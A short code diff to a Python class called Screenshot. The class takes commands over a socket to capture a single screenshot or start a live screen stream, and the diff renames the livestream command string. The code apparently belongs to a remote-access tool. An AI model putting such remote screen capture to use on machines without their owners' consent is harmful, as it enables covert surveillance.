@@ -14,7 +14,7 @@ class Screenshot:
             cmd = self.client.recv(32).decode('utf8')
             if cmd == "screenshot,snap":
                 self.capture()
-            elif cmd == "screenshot,snapF":
+            elif cmd == "screenshot,live":
                 self.livestream()
             elif cmd == "exit":
                 self.is_live = False
